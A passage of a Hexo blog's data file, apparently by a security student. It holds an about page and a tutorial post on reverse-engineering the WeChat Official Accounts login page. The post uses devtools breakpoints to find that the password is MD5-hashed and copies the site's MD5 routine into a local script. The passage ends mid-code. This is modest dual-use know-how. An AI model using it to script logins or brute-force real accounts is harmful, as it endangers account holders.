702257bb8b2b","modified":1742228236451},{"_id":"public/posts/31899/image-20250306003105176.png","hash":"87bc2cfbbb02a2989e7a23663e96b48f97557f5a","modified":1742228236451},{"_id":"public/posts/31899/image-20250310232549937.png","hash":"b509148c18dd99b5c952f8cd34c9287da3cfec32","modified":1742228236451},{"_id":"public/posts/31899/image-20250310232652649.png","hash":"c71a05a6450b4dc19db917951e9984062e760677","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312225540034.png","hash":"a4d3b8edb7801cb1c2755e319ebba363e478ea4e","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312225451754.png","hash":"14182d2bfc42749edb6569fe6a2b82156072447d","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312231626743.png","hash":"b6cc6d1b92e9996458df4ca7938ebdeb39ba668d","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312233222030.png","hash":"55bac81d9de272a64eeb4ab4173aa8ab5accea99","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312234548755.png","hash":"f9724dc3a17f599d28dd683bd5cf60360873eecd","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312234834804.png","hash":"bf82c698c3bae2c115070bfe1bc45f1d6a0a7340","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312235311801.png","hash":"cef55423a825ee9cf0664230d1c4b60cdd69473f","modified":1742228236451},{"_id":"public/css/noscript.css","hash":"4cd5301e478e0e0d4b176740ec314087ec5cb707","modified":1742228236451},{"_id":"public/js/comments.js","hash":"66ae2e26ea36a41b72c638ea8b220296638ae952","modified":1742228236451},{"_id":"public/js/config.js","hash":"4c4ebbe3b3f3841a26f9d5af6d0ba8bc6da01c54","modified":1742228236451},{"_id":"public/js/motion.js","hash":"6f751f5c9499a39d7c5e1d323db3260342dd9431","modified":1742228236451},{"_id":"public/js/next-boot.js","hash":"8e2d589585f5270ee90285d3e65b69923c7629d8","modified":1742228236451},{"_id":"public/js/sidebar.js","hash":"2ee359ae48273b01ba1e0768704524e08702c7eb","modified":1742228236451},{"_id":"public/js/third-party/addtoany.js","hash":"5276c8f78ee562a8965216dc67d762e59cb4a9f2","modified":1742228236451},{"_id":"public/js/third-party/analytics/matomo.js","hash":"c6a25b26a1443caa70b47fd3dfa282271574deb5","modified":1742228236451},{"_id":"public/js/third-party/search/local-search.js","hash":"4262628e173b16c4c6c18f817173dd103fb9e9a8","modified":1742228236451},{"_id":"public/css/main.css","hash":"f3a3f79ce20d331796de661c9516c7dfbe8cdb1c","modified":1742228236451},{"_id":"public/js/utils.js","hash":"d7954a623be2ee9fe3eadc785b17c17afac6c34d","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250317212314918.png","hash":"2840e01fe91d861a0dbcc386680762e816e69ed7","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250317215045138.png","hash":"3d59cbca3489a96556e810f1834d6658a305f1ab","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250317215215191.png","hash":"8e20f4ceab7e29ffd04cd5b0c041a91de841cc34","modified":1742228236451},{"_id":"public/css/hbe.style.css","hash":"6d70c82ef27e07e976e8b0386a74c2c401a15fb0","modified":1742228236451},{"_id":"public/lib/hbe.js","hash":"0a3ffa0053ad2445df4500201aaaf76574ef6ec9","modified":1742228236451},{"_id":"public/posts/31899/image-20250310220934038.png","hash":"127a5a5390aac9e40756f1d03cc5989122f1b82e","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312225424438.png","hash":"959c0f632f724de20bcf199b1383f7fe02428641","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312225644180.png","hash":"6f6eceb152c0e7859684b5927e6de2b86e9a20bd","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312230827144.png","hash":"a8df544940ee347c9e25864eeed6cc0cf6d2e142","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312231721421.png","hash":"a1ed1c4ec219c83b3032990436834f66eb39099a","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312232023480.png","hash":"36078475f732b4972f8d36621421bf6be3fb5359","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312232151766.png","hash":"bce50d97dd89355cb65a2bbe38c9d710375725d9","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312232336232.png","hash":"d9fbb6fe64358015ea13aab3822f0a6c4d8cf5c8","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312234452887.png","hash":"9fff9e8157758180a790134e4800f2d090354a0f","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250313000046133.png","hash":"b3c07b96b660021f30c1d39a480f4d2488da9964","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312235427207.png","hash":"6ea586ed7f26e2bff24061110493d936bdcc114d","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250313000648523.png","hash":"df51c0631276e28141c17a9a171693a104dbbf18","modified":1742228236451},{"_id":"public/images/logo.jpg","hash":"2083a5dbf56cf96709614c9f77b8675b4bd04687","modified":1742228236451},{"_id":"public/posts/31899/image-20250310224830354.png","hash":"8ef8751b9413c3226c7da0648a3e79a2fecf0588","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312231604753.png","hash":"59e2f002c3c14539127a0b46fb097a3fe74bda0f","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312231837586.png","hash":"08b7fc79377d8cf39ac743cc5379c1f4b75b98f1","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250313001039560.png","hash":"ce98f00218cb2f00c48225d96b4271c5c0fdac7a","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250313001105420.png","hash":"326d1102d813fcb33bdaf07faaa40ce95b31dbf9","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250317232800500.png","hash":"7cf142f8283bbdb3b911d6c2d4d35d61228227d8","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250317235842515.png","hash":"fe5df22adb2c0042a30b9f9e40b744549c2e65da","modified":1742228236451},{"_id":"public/posts/31899/image-20250311002549978.png","hash":"a2ae0ba0f922e4553006fec0599dea6c474bf4f8","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250312234722354.png","hash":"175bc4da4b343b190daa8a88c1787436cb8fd6a9","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250317234038917.png","hash":"052e0e431f70524afa9e661333e214858510eff7","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250317235614010.png","hash":"bfd81866519693c53e77e12b57870e6dababea67","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250317234329708.png","hash":"d1cc74d7597e03cca3a01cd6402ca7fee1b651ce","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250317233635882.png","hash":"db1e4c9e761c2bd59a8950e1bbb66433fa498620","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250317235246581.png","hash":"a33a1d06016e16ce9a0d39f05c3c2dddc5f0f161","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250318001134113.png","hash":"d914db0721123633d9e14cca7994bea120801a54","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250317233427264.png","hash":"54a65e557be87587f418258f7399efd5da39168f","modified":1742228236451},{"_id":"public/posts/e93fc31a/image-20250318000514529.png","hash":"59fca2f582584df6e505879259411a8910a7e969","modified":1742228236451},{"_id":"public/posts/31899/image-20250306001213412.png","hash":"165c0e3398b354718e23dd8186007bc0932406d7","modified":1742228236451},{"_id":"public/posts/31899/image-20250310230842396.png","hash":"5b829d000cf43aedcd4f514535d93e56cb3202f3","modified":1742228236451}],"Category":[],"Data":[],"Page":[{"title":"about","date":"2025-03-03T15:24:21.000Z","type":"about","_content":"\n### Start\n\n欢迎各位大佬光临，这里是squar3cのblog，文章可能水水水，求放过:confounded::confounded::confounded:\n\n一直致力于提升技术的咸鱼:fish:一枚​\n\n贪玩且懒惰:innocent:（ddl常伴吾身）\n\n### 小目标\n\n- [x] ~~赚钱换新手机~~ 兼职 2023.5.14 \n\n- [x] ~~大二暑期实习~~ 北京长亭 2024.5.6\n- [x] ~~大三甲方实习~~ 快手 2024.12.9\n- [ ] 秋招offer不在北京！！！\n- [ ] 系统学完渗透知识并挖到第一个src\n- [ ] 产出自认为满意的文章\n- [ ] 亲手做出一桌子美味的饭菜\n\n### 联系方式\n\n✉️：2903156425@qq.com\n","source":"about/index.md","raw":"---\ntitle: about\ndate: 2025-03-03 23:24:21\ntype: \"about\"\n---\n\n### Start\n\n欢迎各位大佬光临，这里是squar3cのblog，文章可能水水水，求放过:confounded::confounded::confounded:\n\n一直致力于提升技术的咸鱼:fish:一枚​\n\n贪玩且懒惰:innocent:（ddl常伴吾身）\n\n### 小目标\n\n- [x] ~~赚钱换新手机~~ 兼职 2023.5.14 \n\n- [x] ~~大二暑期实习~~ 北京长亭 2024.5.6\n- [x] ~~大三甲方实习~~ 快手 2024.12.9\n- [ ] 秋招offer不在北京！！！\n- [ ] 系统学完渗透知识并挖到第一个src\n- [ ] 产出自认为满意的文章\n- [ ] 亲手做出一桌子美味的饭菜\n\n### 联系方式\n\n✉️：2903156425@qq.com\n","updated":"2025-03-03T18:02:19.725Z","path":"about/index.html","comments":1,"layout":"page","_id":"cm8d9pkhj0000lsjf0lzrbqib","content":"<h3 id=\"Start\"><a href=\"#Start\" class=\"headerlink\" title=\"Start\"></a>Start</h3><p>欢迎各位大佬光临，这里是squar3cのblog，文章可能水水水，求放过<span class=\"github-emoji\"><span>😖</span><img src=\"https://github.githubassets.com/images/icons/emoji/unicode/1f616.png?v8\" aria-hidden=\"true\" onerror=\"this.parent.classList.add('github-emoji-fallback')\"></span><span class=\"github-emoji\"><span>😖</span><img src=\"https://github.githubassets.com/images/icons/emoji/unicode/1f616.png?v8\" aria-hidden=\"true\" onerror=\"this.parent.classList.add('github-emoji-fallback')\"></span><span class=\"github-emoji\"><span>😖</span><img src=\"https://github.githubassets.com/images/icons/emoji/unicode/1f616.png?v8\" aria-hidden=\"true\" onerror=\"this.parent.classList.add('github-emoji-fallback')\"></span></p>\n<p>一直致力于提升技术的咸鱼<span class=\"github-emoji\"><span>🐟</span><img src=\"https://github.githubassets.com/images/icons/emoji/unicode/1f41f.png?v8\" aria-hidden=\"true\" onerror=\"this.parent.classList.add('github-emoji-fallback')\"></span>一枚​</p>\n<p>贪玩且懒惰<span class=\"github-emoji\"><span>😇</span><img src=\"https://github.githubassets.com/images/icons/emoji/unicode/1f607.png?v8\" aria-hidden=\"true\" onerror=\"this.parent.classList.add('github-emoji-fallback')\"></span>（ddl常伴吾身）</p>\n<h3 id=\"小目标\"><a href=\"#小目标\" class=\"headerlink\" title=\"小目标\"></a>小目标</h3><ul>\n<li><p><input checked=\"\" disabled=\"\" type=\"checkbox\"> \n<del>赚钱换新手机</del> 兼职 2023.5.14 </p>\n</li>\n<li><p><input checked=\"\" disabled=\"\" type=\"checkbox\"> \n<del>大二暑期实习</del> 北京长亭 2024.5.6</p>\n</li>\n<li><p><input checked=\"\" disabled=\"\" type=\"checkbox\"> \n<del>大三甲方实习</del> 快手 2024.12.9</p>\n</li>\n<li><p><input disabled=\"\" type=\"checkbox\"> \n秋招offer不在北京！！！</p>\n</li>\n<li><p><input disabled=\"\" type=\"checkbox\"> \n系统学完渗透知识并挖到第一个src</p>\n</li>\n<li><p><input disabled=\"\" type=\"checkbox\"> \n产出自认为满意的文章</p>\n</li>\n<li><p><input disabled=\"\" type=\"checkbox\"> \n亲手做出一桌子美味的饭菜</p>\n</li>\n</ul>\n<h3 id=\"联系方式\"><a href=\"#联系方式\" class=\"headerlink\" title=\"联系方式\"></a>联系方式</h3><p>✉️：<a href=\"mailto:2903156425@qq.com\">2903156425@qq.com</a></p>\n","length":254,"excerpt":"","more":"<h3 id=\"Start\"><a href=\"#Start\" class=\"headerlink\" title=\"Start\"></a>Start</h3><p>欢迎各位大佬光临，这里是squar3cのblog，文章可能水水水，求放过:confounded::confounded::confounded:</p>\n<p>一直致力于提升技术的咸鱼:fish:一枚​</p>\n<p>贪玩且懒惰:innocent:（ddl常伴吾身）</p>\n<h3 id=\"小目标\"><a href=\"#小目标\" class=\"headerlink\" title=\"小目标\"></a>小目标</h3><ul>\n<li><p><input checked=\"\" disabled=\"\" type=\"checkbox\"> \n<del>赚钱换新手机</del> 兼职 2023.5.14 </p>\n</li>\n<li><p><input checked=\"\" disabled=\"\" type=\"checkbox\"> \n<del>大二暑期实习</del> 北京长亭 2024.5.6</p>\n</li>\n<li><p><input checked=\"\" disabled=\"\" type=\"checkbox\"> \n<del>大三甲方实习</del> 快手 2024.12.9</p>\n</li>\n<li><p><input disabled=\"\" type=\"checkbox\"> \n秋招offer不在北京！！！</p>\n</li>\n<li><p><input disabled=\"\" type=\"checkbox\"> \n系统学完渗透知识并挖到第一个src</p>\n</li>\n<li><p><input disabled=\"\" type=\"checkbox\"> \n产出自认为满意的文章</p>\n</li>\n<li><p><input disabled=\"\" type=\"checkbox\"> \n亲手做出一桌子美味的饭菜</p>\n</li>\n</ul>\n<h3 id=\"联系方式\"><a href=\"#联系方式\" class=\"headerlink\" title=\"联系方式\"></a>联系方式</h3><p>✉️：<a href=\"mailto:&#x32;&#x39;&#x30;&#51;&#49;&#x35;&#54;&#52;&#50;&#53;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;\">2903156425@qq.com</a></p>\n"},{"title":"tags","date":"2025-03-03T15:23:25.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2025-03-03 23:23:25\ntype: \"tags\"\n---\n","updated":"2025-03-03T16:42:58.214Z","path":"tags/index.html","comments":1,"layout":"page","_id":"cm8d9pkhn0002lsjf3h22e319","content":"","length":0,"excerpt":"","more":""}],"Post":[{"title":"js逆向","hide":false,"abbrlink":42054,"date":"2025-03-11T16:03:11.000Z","_content":"\n\n\n### 微信公众号加密算法分析\n\n打开谷歌开发者工具，登录账户密码抓包。\n\n```\nusername: 1234\npwd: 81dc9bdb52d04dc20036dbd8313ed055\n```\n\n查看调用栈，发现几个和`loginpage`相关，打上断点。\n\n![image-20250312004307050](js逆向/image-20250312004307050.png)\n\n重新登录，开始调试\n\n![image-20250312005430526](js逆向/image-20250312005430526.png)\n\n在第一个断点处并未加密，跳到下一个断点\n\n![image-20250312005550419](js逆向/image-20250312005550419.png)\n\n这里`pwd`也还未加密，继续调试\n\n![image-20250312005630018](js逆向/image-20250312005630018.png)\n\n仍未加密，跳到`p`函数处下断点，继续调试\n\n```javascript\nk.exports = function(n, u, i) {\n    if (!u) {\n        if (!i) {\n            return x(n)\n        } else {\n            return B(n)\n        }\n    }\n    if (!i) {\n        return R(u, n)\n    } else {\n        return M(u, n)\n    }\n}\n// x(n)\n// '81dc9bdb52d04dc20036dbd8313ed055'\n```\n\n那么这里就找到了加密函数位置，将代码复制到本地，改为自执行函数，并将上述函数结果用`getStr`变量接收。同时不能忘记加上`substr()`。\n\n```javascript\npwd: p(r.pwd.substr(0, 16))\n```\n\n那么最终代码如下\n\n```javascript\nvar getStr\n!function(I, T, h) {\n    \"use strict\";\n    var v;\n    ;!(v = function(m, D, k) {\n        function _(n, u) {\n            var i = (n & 65535) + (u & 65535)\n                , b = (n >> 16) + (u >> 16) + (i >> 16);\n            return b << 16 | i & 65535\n        }\n        function E(n, u) {\n            return n << u | n >>> 32 - u\n        }\n        function w(n, u, i, b, S, j) {\n            return _(E(_(_(u, n), _(b, j)), S), i)\n        }\n        function C(n, u, i, b, S, j, F) {\n            return w(u & i | ~u & b, n, u, S, j, F)\n        }\n        function d(n, u, i, b, S, j, F) {\n            return w(u & b | i & ~b, n, u, S, j, F)\n        }\n        function l(n, u, i, b, S, j, F) {\n            return w(u ^ i ^ b, n, u, S, j, F)\n        }\n        function p(n, u, i, b, S, j, F) {\n            return w(i ^ (u | ~b), n, u, S, j, F)\n        }\n        function f(n, u) {\n            n[u >> 5] |= 128 << u % 32;\n            n[(u + 64 >>> 9 << 4) + 14] = u;\n            var i, b, S, j, F, s = 1732584193, o = -271733879, a = -1732584194, t = 271733878;\n            for (i = 0; i < n.length; i += 16) {\n                b = s;\n                S = o;\n                j = a;\n                F = t;\n                s = C(s, o, a, t, n[i], 7, -680876936);\n                t = C(t, s, o, a, n[i + 1], 12, -389564586);\n                a = C(a, t, s, o, n[i + 2], 17, 606105819);\n                o = C(o, a, t, s, n[i + 3], 22, -1044525330);\n                s = C(s, o, a, t, n[i + 4], 7, -176418897);\n                t = C(t, s, o, a, n[i + 5], 12, 1200080426);\n                a = C(a, t, s, o, n[i + 6], 17, -1473231341);\n                o = C(o, a, t, s, n[i + 7], 22, -45705983);\n                s = C(s, o, a, t, n[i + 8], 7, 1770035416);\n                t = C(t, s, o, a, n[i + 9], 12, -1958414417);\n                a = C(a, t, s, o, n[i + 10], 17, -42063);\n                o = C(o, a, t, s, n[i + 11], 22, -1990404162);\n                s = C(s, o, a, t, n[i + 12], 7, 1804603682);\n                t = C(t, s, o, a, n[i + 13], 12, -40341101);\n                a = C(a, t, s, o, n[i + 14], 17, -1502002290);\n                o = C(o, a, t, s, n[i + 15], 22, 1236535329);\n                s = d(s, o, a, t, n[i + 1], 5, -165796510);\n                t = d(t, s, o, a, n[i + 6], 9, -1069501632);\n                a = d(a, t, s, o, n[i + 11], 14, 643717713);\n                o = d(o, a, t, s, n[i], 20, -373897302);\n                s = d(s, o, a, t, n[i + 5], 5, -701558691);\n                t = d(t, s, o, a, n[i + 10], 9, 38016083);\n                a = d(a, t, s, o, n[i + 15], 14, -660478335);\n                o = d(o, a, t, s, n[i + 4], 20, -405537848);\n                s = d(s, o, a, t, n[i + 9], 5, 568446438);\n                t = d(t, s, o, a, n[i + 14], 9, -1019803690);\n                a = d(a, t, s, o, n[i + 3], 14, -187363961);\n                o = d(o, a, t, s, n[i + 8], 20, 1163531501);\n                s = d(s, o, a, t, n[i + 13], 5, -1444681467);\n                t = d(t, s, o, a, n[i + 2], 9, -51403784);\n                a = d(a, t, s, o, n[i + 7], 14, 1735328473);\n                o = d(o, a, t, s, n[i + 12], 20, -1926607734);\n                s = l(s, o, a, t, n[i + 5], 4, -378558);\n                t = l(t, s, o, a, n[i + 8], 11, -2022574463);\n                a = l(a, t, s, o, n[i + 11], 16, 1839030562);\n                o = l(o, a, t, s, n[i + 14], 23, -35309556);\n                s = l(s, o, a, t, n[i + 1], 4, -1530992060);\n                t = l(t, s, o, a, n[i + 4], 11, 1272893353);\n                a = l(a, t, s, o, n[i + 7], 16, -155497632);\n                o = l(o, a, t, s, n[i + 10], 23, -1094730640);\n                s = l(s, o, a, t, n[i + 13], 4, 681279174);\n                t = l(t, s, o, a, n[i], 11, -358537222);\n                a = l(a, t, s, o, n[i + 3], 16, -722521979);\n                o = l(o, a, t, s, n[i + 6], 23, 76029189);\n                s = l(s, o, a, t, n[i + 9], 4, -640364487);\n                t = l(t, s, o, a, n[i + 12], 11, -421815835);\n                a = l(a, t, s, o, n[i + 15], 16, 530742520);\n                o = l(o, a, t, s, n[i + 2], 23, -995338651);\n                s = p(s, o, a, t, n[i], 6, -198630844);\n                t = p(t, s, o, a, n[i + 7], 10, 1126891415);\n                a = p(a, t, s, o, n[i + 14], 15, -1416354905);\n                o = p(o, a, t, s, n[i + 5], 21, -57434055);\n                s = p(s, o, a, t, n[i + 12], 6, 1700485571);\n                t = p(t, s, o, a, n[i + 3], 10, -1894986606);\n                a = p(a, t, s, o, n[i + 10], 15, -1051523);\n                o = p(o, a, t, s, n[i + 1], 21, -2054922799);\n                s = p(s, o, a, t, n[i + 8], 6, 1873313359);\n                t = p(t, s, o, a, n[i + 15], 10, -30611744);\n                a = p(a, t, s, o, n[i + 6], 15, -1560198380);\n                o = p(o, a, t, s, n[i + 13], 21, 1309151649);\n                s = p(s, o, a, t, n[i + 4], 6, -145523070);\n                t = p(t, s, o, a, n[i + 11], 10, -1120210379);\n                a = p(a, t, s, o, n[i + 2], 15, 718787259);\n                o = p(o, a, t, s, n[i + 9], 21, -343485551);\n                s = _(s, b);\n                o = _(o, S);\n                a = _(a, j);\n                t = _(t, F)\n            }\n            return [s, o, a, t]\n        }\n        function L(n) {\n            var u, i = \"\";\n            for (u = 0; u < n.length * 32; u += 8) {\n                i += String.fromCharCode(n[u >> 5] >>> u % 32 & 255)\n            }\n            return i\n        }\n        function y(n) {\n            var u, i = [];\n            i[(n.length >> 2) - 1] = void 0;\n            for (u = 0; u < i.length; u += 1) {\n                i[u] = 0\n            }\n            for (u = 0; u < n.length * 8; u += 8) {\n                i[u >> 5] |= (n.charCodeAt(u / 8) & 255) << u % 32\n            }\n            return i\n        }\n        function $(n) {\n            return L(f(y(n), n.length * 8))\n        }\n        function q(n, u) {\n            var i, b = y(n), S = [], j = [], F;\n            S[15] = j[15] = void 0;\n            if (b.length > 16) {\n                b = f(b, n.length * 8)\n            }\n            for (i = 0; i < 16; i += 1) {\n                S[i] = b[i] ^ 909522486;\n                j[i] = b[i] ^ 1549556828\n            }\n            F = f(S.concat(y(u)), 512 + u.length * 8);\n            return L(f(j.concat(F), 512 + 128))\n        }\n        function z(n) {\n            var u = \"0123456789abcdef\", i = \"\", b, S;\n            for (S = 0; S < n.length; S += 1) {\n                b = n.charCodeAt(S);\n                i += u.charAt(b >>> 4 & 15) + u.charAt(b & 15)\n            }\n            return i\n        }\n        function Q(n) {\n            return unescape(encodeURIComponent(n))\n        }\n        function B(n) {\n            return $(Q(n))\n        }\n        function x(n) {\n            return z(B(n))\n        }\n        function M(n, u) {\n            return q(Q(n), Q(u))\n        }\n        function R(n, u) {\n            return z(M(n, u))\n        }\n        getStr = function(n, u, i) {\n            if (!u) {\n                if (!i) {\n                    return x(n)\n                } else {\n                    return B(n)\n                }\n            }\n            if (!i) {\n                return R(u, n)\n            } else {\n                return M(u, n)\n            }\n        }\n    }\n        .call(T, h, T, I),\n    v !== void 0 && (I.exports = v))\n}()\n\nvar password = \"1234\"\nconsole.log(getStr(password.substr(0, 16)))\n// 81dc9bdb52d04dc20036dbd8313ed055\n```\n","source":"_posts/js逆向.md","raw":"---\ntitle: js逆向\nhide: false\ntags:\n  - 网络安全\nabbrlink: 42054\ndate: 2025-03-12 00:03:11\n---\n\n\n\n### 微信公众号加密算法分析\n\n打开谷歌开发者工具，登录账户密码抓包。\n\n```\nusername: 1234\npwd: 81dc9bdb52d04dc20036dbd8313ed055\n```\n\n查看调用栈，发现几个和`loginpage`相关，打上断点。\n\n![image-20250312004307050](js逆向/image-20250312004307050.png)\n\n重新登录，开始调试\n\n![image-20250312005430526](js逆向/image-20250312005430526.png)\n\n在第一个断点处并未加密，跳到下一个断点\n\n![image-20250312005550419](js逆向/image-20250312005550419.png)\n\n这里`pwd`也还未加密，继续调试\n\n![image-20250312005630018](js逆向/image-20250312005630018.png)\n\n仍未加密，跳到`p`函数处下断点，继续调试\n\n```javascript\nk.exports = function(n, u, i) {\n    if (!u) {\n        if (!i) {\n            return x(n)\n        } else {\n            return B(n)\n        }\n    }\n    if (!i) {\n        return R(u, n)\n    } else {\n        return M(u, n)\n    }\n}\n// x(n)\n// '81dc9bdb52d04dc20036dbd8313ed055'\n```\n\n那么这里就找到了加密函数位置，将代码复制到本地，改为自执行函数，并将上述函数结果用`getStr`变量接收。同时不能忘记加上`substr()`。\n\n```javascript\npwd: p(r.pwd.substr(0, 16))\n```\n\n那么最终代码如下\n\n```javascript\nvar getStr\n!function(I, T, h) {\n    \"use strict\";\n    var v;\n    ;!(v = function(m, D, k) {\n        function _(n, u) {\n            var i = (n & 65535) + (u & 65535)\n                , b = (n >> 16) + (u >> 16) + (i >> 16);\n            return b << 16 | i & 65535\n        }\n        function E(n, u) {\n            return n << u | n >>> 32 - u\n        }\n        function w(n, u, i, b, S, j) {\n            return _(E(_(_(u, n), _(b, j)), S), i)\n        }\n        function C(n, u, i, b, S, j, F) {\n            return w(u & i | ~u & b, n, u, S, j, F)\n        }\n        function d(n, u, i, b, S, j, F) {\n            return w(u & b | i & ~b, n, u, S, j, F)\n        }\n        function l(n, u, i, b, S, j, F) {\n            return w(u ^ i ^ b, n, u, S, j, F)\n        }\n        function p(n, u, i, b, S, j, F) {\n            return w(i ^ (u | ~b), n, u, S, j, F)\n        }\n        function f(n, u) {\n            n[u >> 5] |= 128 << u % 32;\n            n[(u + 64 >>> 9 << 4) + 14] = u;\n            var i, b, S, j, F, s = 1732584193, o = -271733879, a = -1732584194, t = 271733878;\n            for (i = 0; i < n.length; i += 16) {\n                b = s;\n                S = o;\n                j = a;\n                F = t;\n                s = C(s, o, a, t, n[i], 7, -680876936);\n                t = C(t, s, o, a, n[i + 1], 12, -389564586);\n                a = C(a, t, s, o, n[i + 2], 17, 606105819);\n                o = C(o, a, t, s, n[i + 3], 22, -1044525330);\n                s = C(s, o, a, t, n[i + 4], 7, -176418897);\n                t = C(t, s, o, a, n[i + 5], 12, 1200080426);\n                a = C(a, t, s, o, n[i + 6], 17, -1473231341);\n                o = C(o, a, t, s, n[i + 7], 22, -45705983);\n                s = C(s, o, a, t, n[i + 8], 7, 1770035416);\n                t = C(t, s, o, a, n[i + 9], 12, -1958414417);\n                a = C(a, t, s, o, n[i + 10], 17, -42063);\n                o = C(o, a, t, s, n[i + 11], 22, -1990404162);\n                s = C(s, o, a, t, n[i + 12], 7, 1804603682);\n                t = C(t, s, o, a, n[i + 13], 12, -40341101);\n                a = C(a, t, s, o, n[i + 14], 17, -1502002290);\n                o = C(o, a, t, s, n[i + 15], 22, 1236535329);\n                s = d(s, o, a, t, n[i + 1], 5, -165796510);\n                t = d(t, s, o, a, n[i + 6], 9, -1069501632);\n                a = d(a, t, s, o, n[i + 11], 14, 643717713);\n                o = d(o, a, t, s, n[i], 20, -373897302);\n                s = d(s, o, a, t, n[i + 5], 5, -701558691);\n                t = d(t, s, o, a, n[i + 10], 9, 38016083);\n                a = d(a, t, s, o, n[i + 15], 14, -660478335);\n                o = d(o, a, t, s, n[i + 4], 20, -405537848);\n                s = d(s, o, a, t, n[i + 9], 5, 568446438);\n                t = d(t, s, o, a, n[i + 14], 9, -1019803690);\n                a = d(a, t, s, o, n[i + 3], 14, -187363961);\n                o = d(o, a, t, s, n[i + 8], 20, 1163531501);\n                s = d(s, o, a, t, n[i + 13], 5, -1444681467);\n                t = d(t, s, o, a, n[i + 2], 9, -51403784);\n                a = d(a, t, s, o, n[i + 7], 14, 1735328473);\n                o = d(o, a, t, s, n[i + 12], 20, -1926607734);\n                s = l(s, o, a, t, n[i + 5], 4, -378558);\n                t = l(t, s, o, a, n[i + 8], 11, -2022574463);\n                a = l(a, t, s, o, n[i + 11], 16, 1839030562);\n                o = l(o, a, t, s, n[i + 14], 23, -35309556);\n                s = l(s, o, a, t, n[i + 1], 4, -1530992060);\n                t = l(t, s, o, a, n[i + 4], 11, 1272893353);\n                a = l(a, t, s, o, n[i + 7], 16, -155497632);\n                o = l(o, a, t, s, n[i + 10], 23, -1094730640);\n                s = l(s, o, a, t, n[i + 13], 4, 681279174);\n                t = l(t, s, o, a, n[i], 11, -358537222);\n                a = l(a, t, s, o, n[i + 3], 16, -722521979);\n                o = l(o, a, t, s, n[i + 6], 23, 76029189);\n                s = l(s, o, a, t, n[i + 9], 4, -640364487);\n                t = l(t, s, o, a, n[i + 12], 11, -421815835);\n                a = l(a, t, s, o, n[i + 15], 16, 530742520);\n                o = l(o, a, t, s, n[i + 2], 23, -995338651);\n                s = p(s, o, a, t, n[i], 6, -198630844);\n                t = p(t, s, o, a, n[i + 7], 10, 1126891415);\n                a = p(a, t, s, o, n[i + 14], 15, -1416354905);\n                o = p(o, a, t, s, n[i + 5], 21, -57434055);\n                s = p(s, o, a, t, n[i + 12], 6, 1700485571);\n                t = p(t, s, o, a, n[i + 3], 10, -1894986606);\n                a = p(a, t, s, o, n[i + 10], 15, -1051523);\n                o = p(o, a, t, s, n[i + 1], 21, -2054922799);\n                s = p(s, o, a, t, n[i + 8], 6, 1873313359);\n                t = p(t, s, o, a, n[i + 15], 10, -30611744);\n                a = p(a, t, s, o, n[i + 6], 15, -1560198380);\n                o = p(o, a, t, s, n[i + 13], 21, 1309151649);\n                s = p(s, o, a, t, n[i + 4], 6, -145523070);\n                t = p(t, s, o, a, n[i + 11], 10, -1120210379);\n                a = p(a, t, s, o, n[i + 2], 15, 718787259);\n                o = p(o, a, t, s, n[i + 9], 21, -343485551);\n                s = _(s, b);\n                o = _(o, S);\n                a = _(a, j);\n                t = _(t, F)\n            }\n            return [s, o, a, t]\n        }\n        function L(n) {\n            var u, i = \"\";\n            for (u = 0; u < n.length * 32; u += 8) {\n                i += String.fromCharCode(n[u >> 5] >>> u % 32 & 255)\n            }\n            return i\n        }\n        function y(n) {\n            var u, i = [];\n            i[(n.length >> 2) - 1] = void 0;\n            for (u = 0; u < i.length; u += 1) {\n                i[u] = 0\n            }\n            for (u = 0; u < n.length * 8; u += 8) {\n                i[u >> 5] |= (n.charCodeAt(u / 8) & 255) << u % 32\n            }\n            return i\n        }\n        function $(n) {\n            return L(f(y(n), n.length * 8))\n        }\n        function q(n, u) {\n            var i, b = y(n), S = [], j = [], F;\n            S[15] = j[15] = void 0;\n            if (b.length > 16) {\n                b = f(b, n.length * 8)\n            }\n            for (i = 0; i < 16; i += 1) {\n                S[i] = b[i] ^ 909522486;\n                j[i] = b[i] ^ 1549556828\n            }\n            F = f(S.concat(y(u)), 512 + u.length * 8);\n            return L(f(j.concat(F), 512 + 128))\n        }\n        function z(n) {\n            var u = \"0123456789abcdef\", i = \"\", b, S;\n            for (S = 0; S < n.length; S += 1) {\n                b = n.charCodeAt(S);\n                i += u.charAt(b >>> 4 & 15) + u.charAt(b & 15)\n            }\n            return i\n        }\n        function Q(n) {\n            return 